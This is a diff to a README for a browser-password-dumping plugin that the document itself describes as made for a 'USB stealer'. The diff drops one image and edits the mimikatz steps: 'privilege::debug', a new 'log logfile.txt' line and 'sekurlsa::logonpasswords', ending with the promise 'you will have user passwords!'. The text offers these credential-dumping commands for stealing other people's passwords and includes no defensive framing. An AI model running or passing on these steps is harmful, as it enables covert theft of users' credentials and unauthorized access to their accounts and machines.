@@ -1,7 +1,6 @@
 # WebBrowserPassView-plugin
 ![webbrowserpassview-icon](https://user-images.githubusercontent.com/43011806/46359326-b0865d80-c671-11e8-85b7-043be5353632.png)
 ![chromepass_37622](https://user-images.githubusercontent.com/43011806/46678213-cdc8a800-cbec-11e8-9e4a-2ca14d99a217.png)
-![iepv_icon](https://user-images.githubusercontent.com/43011806/46815088-da7f0480-cd82-11e8-8aef-fb2c64d3b429.gif)
 
 > This plugin made for Green Force soft on your USB stealer.
 
@@ -51,6 +50,8 @@ Run commands in mimikatz:
 
 > mimikatz # privilege::debug
 
-> mimikatz # sekurlsa::logonPasswords full
+> mimikatz # log logfile.txt
+
+> mimikatz # sekurlsa::logonpasswords
 
 And you will have user passwords!
